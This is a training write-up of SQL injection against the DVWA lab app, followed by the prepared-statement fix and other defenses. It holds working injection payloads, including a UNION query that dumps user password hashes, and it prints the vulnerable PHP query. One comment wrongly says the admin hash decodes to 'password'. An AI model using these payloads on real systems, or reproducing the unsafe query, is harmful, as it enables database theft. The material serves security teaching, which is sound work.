# SQL Injection — Attack & Mitigation Scenario

**Target:** DVWA (Damn Vulnerable Web Application)  
**Vulnerability:** SQL Injection  
**Severity:** Critical

---

## Attack Scenario

### Step 1: Identify the vulnerable parameter

Navigate to the SQL Injection page in DVWA:

```
http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit
```

The `id` parameter is passed directly into a SQL query without sanitization.

### Step 2: Test for SQL injection

```
?id=1' OR '1'='1&Submit=Submit
```

**Result:** All user records displayed instead of a single record — confirms SQL injection.

### Step 3: Determine column count

```
?id=1' ORDER BY 1 -- &Submit=Submit
?id=1' ORDER BY 2 -- &Submit=Submit
?id=1' ORDER BY 3 -- &Submit=Submit
```

Three columns confirmed (error on ORDER BY 4).

### Step 4: Extract usernames and passwords

```
?id=0' UNION SELECT 1, user, password FROM users -- &Submit=Submit
```

**Extracted credentials:**

| User ID | Username | Password (MD5 Hash) |
|---------|----------|---------------------|
| 1 | admin | 21232f297a57a5a743894a0e4a801fc3 |
| 2 | gordonb | e99a18c428cb38d5f260853678922e03 |
| 3 | 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b |
| 4 | pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| 5 | smithy | 5f4dcc3b5aa765d61d8327deb882cf99 |

### Step 5: Crack password hashes

```bash
# admin hash decodes to: password
echo -n "password" | md5sum
# 5f4dcc3b5aa765d61d8327deb882cf99 = password (smithy)
```

---

## Vulnerable Code

```php
$id = $_GET['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysqli_query($conn, $query);
```

**Problem:** User input is concatenated directly into the SQL query.

---

## Mitigation: Prepared Statements

### Fixed Code (PHP)

```php
$stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
$result = $stmt->get_result();
```

### Why This Works

- The `?` placeholder is never interpreted as SQL syntax
- User input is treated as data, not executable code
- Even `' OR '1'='1` is treated as a literal string value
- Database driver handles escaping automatically

### DVWA Impossible Level

DVWA's "Impossible" security level demonstrates proper prepared statements — the same payloads that worked on Low/Medium/High levels have no effect.

---

## Additional Defenses

| Defense | Implementation |
|---------|---------------|
| Prepared statements | Parameterized queries with bound variables |
| Input validation | Accept only numeric IDs: `if (!is_numeric($id)) die()` |
| Least privilege | DB user should only have SELECT on required tables |
| WAF | ModSecurity rules to block SQLi patterns |
| Error suppression | Never show database errors to users |

---

## Impact Summary

| Without Mitigation | With Mitigation |
|-------------------|-----------------|
| Full database dump | Input treated as data only |
| Authentication bypass | Login requires valid credentials |
| Data modification/deletion | Queries cannot be altered |
| Server compromise (xp_cmdshell) | Attack payloads ineffective |
